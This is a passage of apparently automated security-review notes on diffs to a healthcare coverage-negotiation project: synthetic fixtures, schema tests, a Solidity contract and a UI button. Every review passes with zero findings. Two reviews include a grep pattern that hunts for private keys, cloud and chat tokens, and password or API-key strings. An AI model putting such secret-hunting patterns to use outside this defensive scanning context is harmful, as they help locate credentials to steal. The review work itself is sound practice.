`^0x[0-9a-fA-F]{64}$` regex (test lines 96, 138) without collapsing to a
sentinel `0x000...0` that might be misread as "unset".

The only other `0x` hex string is the synthetic `submittedBy` address
`0x0000000000000000000000000000000000000002` (packet.json line 40) — a
20-byte all-zero+2 EOA placeholder (deliberately distinct from the
partd-approvable `...0001` so the two scenarios don't collide). Not a real
wallet.

No `BEGIN ... PRIVATE KEY` blocks, no `AKIA...` (AWS), no `sk-...`
(OpenAI / Stripe), no `xoxb-` / `xoxp-` (Slack), no `ghp_` / `github_pat_`
(GitHub), no `secret` / `password` / `api_key` / `api-key` / `apikey`
markers — `grep -EniI 'BEGIN|PRIVATE KEY|AKIA|sk-[A-Za-z0-9]|xoxb-|xoxp-|ghp_|github_pat|secret|password|api[_-]?key'`
across the new files returns zero matches.

### 4. URL allowlist (legitimate public sources) — PASS

All four URLs in the fixtures resolve to expected public reference sources
matching the task brief:

- `https://dailymed.nlm.nih.gov/dailymed/drugInfo.cfm?setid=df6ad4a1-1852-4cf2-93a1-0d78e18a5ebc`
  (packet.json line 4) — NIH DailyMed FDA label entry for etanercept.
  Expected (fda-label-indication reference).
- `https://www.aetna.com/cpb/medical/data/700_799/0792.html`
  (packet.json line 16) — Aetna Clinical Policy Bulletin 0792 on the
  publicly-served aetna.com domain. Expected (policy-clause reference —
  the load-bearing evidence for the PolicyInvalidated ruling per R23).
- `https://www.costplusdrugs.com/medications/etanercept-50mg-ml/`
  (packet.json line 28) — Mark Cuban Cost Plus public retail price page.
  Expected (price-benchmark reference; brief explicitly names
  costplusdrugs.com or NADAC).
- `https://www.aetna.com/individuals-families/find-a-medication/specialty-drugs.html`
  (payer-profile.json line 8) — Aetna specialty-drug list landing page on
  the publicly-served aetna.com domain. Expected (formularyRelease
  `sourceUrl`).

No bit.ly / t.co / IP-literal / `file://` / unexpected-domain URLs. No URLs
pointing at attacker-controllable infrastructure. The two aetna.com URLs
share a top-level domain only and resolve to distinct legitimate document
paths (CPB vs. specialty-drug list); both are pinned by the
empty-bytes-keccak placeholder `contentHash`, which `scripts/pin-formulary.ts`
is expected to replace with real keccak256 hashes at production-pin time.
The v0 placeholder leaves the supply-chain binding **unenforced today** —
inherited risk from tick 8, not introduced by tick 9.

### 5. JSON parsing safety (test data integrity) — PASS

`JSON.parse(fs.readFileSync(..., "utf-8"))` (test lines 74, 104, 124) is
applied only to **local, repo-tracked, trusted** fixture files under
`demo-data/scenarios/commercial-policy-void/`. No network input, no user
input, no `eval`, no `Function(...)` constructor. A malformed fixture would
throw a `SyntaxError` and fail the test loudly — the correct failure mode.
No prototype-pollution surface — the test reads properties with bracket
notation against `Record<string, unknown>` casts and never spreads or
`Object.assign`s the parsed object into another. Safe by inspection.

## Overall verdict

**PASS — zero findings.** Tick 9's six-file diff is fixtures + a schema test
that mirrors tick 8's shape (the synthetic patient identifier is "Patient B"
rather than "A", the MRN tag is COMM rather than PARTD, the discriminant is
§3.2 Commercial rather than §3.2 PartD, and the load-bearing reference is a
`policy-clause` slice rather than a `formulary-entry` slice — all expected
parameterisation). No new code paths, no new dependencies, no new
network/IO surfaces beyond local trusted-fixture reads. The synthetic note
is clearly fabricated and contains zero HIPAA-identifier patterns; the test
enforces those same patterns as regression guards. The keccak256 placeholder
is the documented well-known empty-bytes hash, identical to tick 8. All four
URLs (DailyMed, two aetna.com paths, costplusdrugs.com) are the legitimate
public sources called out in the task brief. UNIT-3b ships clean.

---

# Security findings — 2026-05-29 tick 8 (UNIT-3 partd-approvable fixtures)

**Verdict:** PASS (0 findings)

## Diff scope

Six new files in the worktree:

1. `demo-data/scenarios/partd-approvable/note.md` — synthetic clinical narrative.
2. `demo-data/scenarios/partd-approvable/packet.json` — EvidenceReference packet
   with three references (DailyMed, CMS formulary, costplusdrugs).
3. `demo-data/scenarios/partd-approvable/payer-profile.json` — PartD profile +
   `formularyRelease` discriminant.
4. `demo-data/scenarios/partd-approvable/requested-drug.json` — NDC/RxNorm/dose
   record for adalimumab.
5. `demo-data/scenarios/partd-approvable/expected-outcome.md` — expected ruling
   narrative ("Approve", round 0).
6. `src/protocol/scenarios.partd-approvable.test.ts` — `node:test` + `node:assert`
   schema tests over the five fixture files.

## Per-concern verdict

### 1. PHI leakage (SPEC-0004 R1 — synthetic-only) — PASS

`note.md` is clearly synthetic. No real names — the patient is referred to as
"Patient A" (line 10, 41) under an explicitly-labelled "Synthetic patient
identifier: P-0001 / MRN 000-PARTD-001" header (line 3). The MRN is a
synthetic-shaped token (`000-PARTD-001`) that telegraphs its fabrication
(leading zeros, payer-line tag, sequence). No DOB appears — only "Year of
birth: 1956" (line 4), which is an HIPAA Safe-Harbor-permissible year-only
value, not a full MM/DD/YYYY date. No SSN, no SSN-shaped digit string
(`\d{3}-\d{2}-\d{4}` not present), no full address (city = "Anytown, USA",
line 5 — a synthetic placeholder), no driver's-license-shaped identifiers
(`[A-Z]{2}\d{6,}` not present), no phone numbers. The plan ID `S5810-001`
(SilverScript) is a publicly-published CMS Part D contract ID, not a
patient identifier. The narrative is generic clinical phrasing
("70-year-old", "14-year history of seropositive RA") — categorical, not
PHI. R1 satisfied.

The test at lines 30–48 codifies these same PHI-marker checks (SSN pattern,
SSN-format digits, MM/DD/YYYY DOB, driver-license shape, plus a
positive-marker assertion that the file contains "synthetic" / "fictional" /
"Patient A"). The note's text passes all of them.

### 2. Path traversal in the test — PASS (no risk)

`src/protocol/scenarios.partd-approvable.test.ts` builds filesystem paths via
`path.resolve(path.dirname(__filename), "..", "..")` (line 18) and then
`path.join(PROJECT_ROOT, "demo-data", "scenarios", "partd-approvable")`
(line 19). The only variable input is the hard-coded array of five filenames
at line 24 (`["note.md", "packet.json", "payer-profile.json",
"requested-drug.json", "expected-outcome.md"]`) and the literal-string
arguments to `scenarioFile(...)` throughout. **No user-supplied string flows
into any `fs.readFileSync` or `fs.existsSync` call.** The `__filename` /
`__dirname` anchor is derived from `import.meta.url` via `fileURLToPath`,
which is a trusted ESM-runtime value, not external input. No traversal
surface.

### 3. Real-key / credential leakage in fixtures — PASS

Full sweep for `0x[0-9a-fA-F]{64}` across the diff returns exactly four
matches, all identical:
`0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`
(packet.json lines 5, 17, 29; payer-profile.json line 10). This is the
**well-known keccak256 of the empty byte string** — a deterministic public
constant, not a private key. It is explicitly labelled as a placeholder in
`payer-profile.json` (line 9: "v0 placeholder — contentHash is keccak256 of
zero bytes (well-known empty-bytes hash); replace with keccak256 of the
actual CMS formulary ZIP at pin time via scripts/pin-formulary.ts"). Using
the empty-bytes keccak as a placeholder rather than zeroing the field is
deliberate: it satisfies the `^0x[0-9a-fA-F]{64}$` regex (test line 77, 137)
without collapsing to a sentinel value (`0x000...0`) that might be treated
as "unset" elsewhere.

The only other `0x` hex string is the synthetic `submittedBy` address
`0x0000000000000000000000000000000000000001` (packet.json line 40) — a
20-byte all-zero+1 EOA placeholder, not a real wallet. No
`-----BEGIN ... PRIVATE KEY-----` blocks, no `AKIA...` (AWS), no `sk-...`
(OpenAI / Stripe / etc.), no `xoxb-` / `xoxp-` (Slack), no `ghp_` /
`github_pat_` (GitHub) — `grep -Eni 'BEGIN|PRIVATE KEY|AKIA|sk-|xoxb-|xoxp-|ghp_|github_pat|secret|password|api[_-]?key'`
across the diff returns zero matches.

### 4. JSON parsing safety — PASS (noted)

`JSON.parse(fs.readFileSync(..., "utf-8"))` (test lines 55, 85, 105, 146) is
applied only to **local, repo-tracked, trusted** fixture files under
`demo-data/scenarios/partd-approvable/`. No network input, no user input,
no `eval`, no `Function(...)` constructor. A malformed fixture would throw
a `SyntaxError` and fail the test loudly, which is the correct failure
mode. No prototype-pollution surface — the test reads properties with
bracket notation against a `Record<string, unknown>` cast and never spreads
the parsed object into another object. Safe by inspection.

### 5. Test data integrity / supply-chain (URLs) — PASS

All four URLs in the fixtures resolve to expected public reference sources:

- `https://dailymed.nlm.nih.gov/dailymed/drugInfo.cfm?setid=...` — NIH
  DailyMed FDA label entry. Expected (FDA-label-indication reference).
- `https://www.cms.gov/medicare/prescription-drug-coverage/formulary/downloads/S5810-001_formulary.zip`
  (appears twice — packet.json line 16, payer-profile.json line 8) — CMS
  Part D formulary download. Expected (formulary-entry + formularyRelease
  sourceUrl).
- `https://www.costplusdrugs.com/medications/adalimumab-40mg-08ml/` — Mark
  Cuban Cost Plus public retail price page. Expected (price-benchmark
  reference for the R24 cost-band rule, called out in expected-outcome.md).

No bit.ly / t.co / IP-literal / file:// / unexpected-domain URLs. No URLs
pointing at attacker-controllable infrastructure. Each URL is paired with a
`contentHash` field that — once swapped from the empty-bytes placeholder to
the real keccak via `scripts/pin-formulary.ts` — will provide
content-integrity binding against cache poisoning at pin time. The v0
placeholder leaves the supply-chain binding **unenforced today**; this is
acknowledged in the inline `_note` field and is out-of-scope for tick 8
(no findings at this scope).

## Overall verdict

**PASS — zero findings.** The six-file diff is fixtures + a schema test; no
new code paths, no new dependencies, no new network/IO surfaces beyond local
trusted-fixture reads, no private keys, no credentials, no PHI. The
synthetic note is clearly fabricated and contains zero HIPAA-identifier
patterns; the test enforces those same patterns as regression guards. The
keccak256 placeholders are the documented well-known empty-bytes hash, with
a real-pinning plan called out in-file. All four URLs are expected public
reference sources (DailyMed, CMS, costplusdrugs). UNIT-3 ships clean.

---

# Security findings — tick 4 (UNIT-2)

**Verdict:** PASS (0 findings)

## Findings

None.

## Notes

Reviewed the uncommitted UNIT-2 diff against
`contracts/contracts/CoverageNegotiation.sol`,
`contracts/test/CoverageNegotiation.test.ts`, `src/contract/simulated.ts`, and
`src/contract/simulated.auth.test.ts`. All six focused security checks pass.

1. **R14a tightening — no DoS surface.** `appeal()` now requires
   `n.state == State.Denied` (line 436). The only writer of `State.Denied` is
   `handleResponse` (line 655), and that function is gated by
   `require(msg.sender == address(platform), "callback: not platform")` at
   line 571. No party-controlled path can flip the state to Denied or away
   from Denied to grief an appellant — the predicate is set exclusively by
   the trusted Somnia agent platform via its consensus-encoded ruling. There
   is no alternate entry point: `_get(reqId)` is a read-only fetch and
   `_onlyParty(n)` runs after the state check, so the state gate is the sole
   entry-state predicate on `appeal()`. The cap-deadlock short-circuit
   (`n.round >= maxRounds`, line 445) still runs AFTER the state check, so an
   Approved state cannot be deadlocked via `appeal()` — the R14a revert fires
   first. No new revert paths consume caller ETH: the revert is a
   pre-state-effects `require`, so `msg.value` rolls back with the tx. The
   T10 wrong-state test was updated to expect the new error string.

2. **R2b rejection — no DoS or bypass surface.**
   `require(providerAddr != insurerAddr, "create: self-contract")` at line 323
   sits after parameter validation (`addr: zero`, `auth: not provider`,
   `qty: zero`) and BEFORE `_nextId++` (line 325) and any struct writes — no
   state effects to roll back, CEI-clean. A frontrunner submitting
   `createContract(provider, provider)` would revert their own tx without
   affecting any other party's create flow (each call atomically creates a
   fresh `reqId`). The check is an address-equality predicate, not a
   shared-key predicate; a party controlling two distinct wallets can still
   create a contract between them, but R2b is explicitly scoped to address
   equality (a coverage-policy-design choice, not a key-control one) and that
   limitation is acknowledged in the spec. The T9 multi-tenant test that
   exercised the now-removed single-shared-wallet path was updated to assert
   the revert instead.

3. **PacketSubmitted event — no PHI leakage.** The new event signature
   (lines 199-204) carries `uint256 indexed reqId`, `uint256 indexed round`,
   `bytes32 packetRoot`, `bytes32 packetUrl`. At emit time both `packetRoot`
   and `packetUrl` are set to `n.evidenceUri` (line 776), which is a
   `bytes32` opaque ref (line 107). The contract's PHI invariant (line 52:
   "Only keccak256 hashes, opaque refs (bytes32), amounts, and settlement"
   on-chain) is preserved — `evidenceUri` is already emitted in
   `ContentCommitted`, `EvidenceSubmitted`, and `Appealed` events, so this
   adds no new disclosure surface. SPEC-0004 R3/R4 invariant intact.

4. **Event ordering / CEI.** `PacketSubmitted` is emitted at line 776, AFTER
   all state effects (`n.totalFees`, `n.rulingDeadline`, `n.state =
   UnderReview` at lines 764-768) and BEFORE the external
   `platform.createRequest` call at line 785. If `platform.createRequest`
   reverts, the entire tx reverts including the event — observers cannot see
   a PacketSubmitted that does not correspond to a successful fire. The
   `nonReentrant` guard on all three callers (`requestAdjudication`,
   `submitEvidence`, `appeal`) blocks a reentrant double-emit during the
   external call. CEI preserved.

5. **`n.round` correctness at emit.** Each of the three `_fireAgent` call
   sites sets `n.round` to the round being requested BEFORE invoking
   `_fireAgent`: `requestAdjudication` sets `n.round = 1` at line 378 and
   fires at line 380; `submitEvidence` does `n.round += 1` at line 412 and
   fires at line 414; `appeal` does `n.round += 1` at line 458 and fires at
   line 461. The new test (line 244) asserts emit with `round` 1/2/3 across
   the three paths — confirms the invariant under exercise.

6. **simulated.ts parity — error strings match exactly.** The simulated
   backend mirrors both R14a and R2b. Grep for the new error strings
   confirms exact match between Solidity and TS: `"create: self-contract"`
   (Sol line 323 ↔ sim line 217 ↔ sim test line 137) and
   `"appeal: prior ruling not Deny"` (Sol line 436 ↔ sim line 322).
   `simulated.ts` lowercases both addresses before comparison
   (`.toLowerCase()` on each side at line 216), which correctly handles
   checksummed-vs-unchecksummed address inputs at the TS boundary while
   preserving the Solidity contract's bytewise-equality semantics (Solidity
   `address` equality is canonical-form-agnostic). The T10 wrong-state
   expectation in the contract test (line 758) was updated to the new error
   string; no stale `"appeal: not ruled"` references remain in either test
   file (the simulated.auth.test.ts removed the single-shared-wallet
   happy-path entirely and replaced it with a revert assertion).

Out-of-scope confirmations: no new external calls beyond the existing
`platform.createRequest` (PacketSubmitted is event-only); no new storage
slots; no new modifiers; no new external entry points; no ABI changes
(PacketSubmitted is additive — does not alter existing event signatures).
The diff is minimally invasive, exactly UNIT-2 scope.

## Tick 46 security-review

Scope: tick-46 diff vs `b88261d` — two files changed.

- `web/src/views/Create.tsx` (+27 lines): adds a `Load from EHR (CDS Hooks)`
  button (`data-testid="cds-prefill"`) that calls `orderSignToDraft` on the
  compile-time `SAMPLE_ORDER_SIGN_REQUEST` fixture, populates form state, and
  sets a `cdsProvenance` banner string.
- `web/tests/agent-browser/run.sh` (Scenario G, ~6 lines): replaces the UI
  button click with a direct `window.__curie.negotiation.insurerEngage` eval
  so the contract-side R11 gating is exercised regardless of UI affordances.

### Per-concern verdict

1. **PHI / sensitive-data leak in `SAMPLE_ORDER_SIGN_REQUEST`.** PASS. The
   fixture at `src/integrations/cds-hooks/fixture.ts` is fully synthetic per
   SPEC-0004 R1. Identifiers are clearly marked: `Practitioner/synthetic-dr-001`,
   `Patient/synthetic-pt-001`, `Encounter/synthetic-enc-001`, `medreq-synthetic-001`,
   `hookInstance` is a random UUIDv4. No SSN / DOB / MRN / real-name patterns;
   subject display is literally `"Synthetic Patient (demo)"`. The drug
   (adalimumab / RxNorm 1366724, NDC 00074-3799-02) and diagnosis (ICD-10 L40.0,
   "Psoriasis vulgaris") are public code-system entries, not patient data. The
   fixture header explicitly states `NO PHI: every identifier and value here is
   SYNTHETIC` and matches `demo-data/sample-case.md`. No real patient data.

2. **Untrusted-input handling in `orderSignToDraft`.** PASS. The mapper's only
   call site in this diff is the compile-time constant
   `SAMPLE_ORDER_SIGN_REQUEST` — there is no external-input surface at the UI
   today. For completeness, the mapper itself defends correctly: optional-chain
   on `req.context?.draftOrders?.entry` rejects missing bundles with a thrown
   `Error`; `entries.find(e => e.resource?.resourceType === "MedicationRequest")`
   filters before unwrap; `toBigInt()` rejects NaN / non-finite / negative
   values; `quantity <= 0n` is rejected (SPEC-0001 R2/R6a). No path traversal —
   the mapper performs no I/O and no filesystem access. No prototype-pollution
   vector — fields are read via dotted property access (no `Object.assign`,
   no spread of attacker-controlled keys, no dynamic `[key]` writes from
   payload data); the returned `draft` is a fresh object literal. The
   composed `justification` string is built from diagnosis + drug + numeric
   quantity/daysSupply only; patient identifiers (`patientId`, `subject`) are
   intentionally NOT propagated (mapper header comment + observed behavior).

3. **XSS in `cdsProvenance` banner.** PASS. The banner at Create.tsx:165-170
   renders the string inside `<span>{cdsProvenance}</span>` — React's default
   JSX-child interpolation auto-escapes. No `dangerouslySetInnerHTML`, no
   `innerHTML`, no `eval`. The banner content is composed in `loadCdsOrder()`
   as `` `CDS Hooks order-sign · hook ${SAMPLE_ORDER_SIGN_REQUEST.hook}` ``,
   where `hook` is the compile-time literal `"order-sign"` from the fixture —
   the value cannot carry user-controlled markup in this build. Even if the
   fixture were swapped for live EHR payload tomorrow, the JSX text-child
   escaping is the second layer of defense. No XSS surface.

4. **Test-API surface on `window.__curie`.** PASS. Tick 46 did not modify
   `web/src/client.ts`. The Scenario G change calls
   `window.__curie.negotiation.insurerEngage(1n, zeroBytes32, zeroBytes32)` —
   this is the regular pre-existing client method (already exposed before
   tick 46), not a test-only setter. The tick-45 `setNextDecision` /
   `setNextCostPlusUnitPrice` / `setNextNadacUnitPrice` setters are
   unchanged. No new exposure surface added in tick 46.

5. **Type-cast soundness — `requestedAmount` falsy on 0n.** PASS (informational).
   The form-prefill line
   `draft.requestedAmount ? draft.requestedAmount.toString() : SAMPLE_CASE.requestedAmount`
   would indeed treat `0n` as falsy and fall back to the sample-case default
   amount. This is not a security concern: (a) the v0 fixture does not set
   `requestedAmount` at all, so the branch is exercised only via the
   `undefined` path today; (b) even if a future payload supplied `0n`, the
   downstream SPEC-0001 R2/R6a quantity-cap check and the create-flow
   amount validation would handle it; (c) the form is a UI prefill, not a
   trust boundary — the on-chain commit hashes whatever the user submits.
   No information-disclosure or auth-bypass implication. Worth a follow-up
   `=== undefined` tightening in a future tick for correctness, but not a
   security finding.

### Notes

- The Scenario G eval uses a zero-bytes32 evidence ref and zero policy hash
  (`'0x' + '00'.repeat(32)`); these are public sentinels, not secrets.
- The provenance banner exists to reduce the social-engineering risk that a
  form filled by a synthetic EHR-mock could be mistaken for clinician-typed
  content — modestly defensive UX, not a regression.
- No new external network calls, no new persisted state, no new contract
  call paths in this diff.

### Verdict: PASS (zero findings)
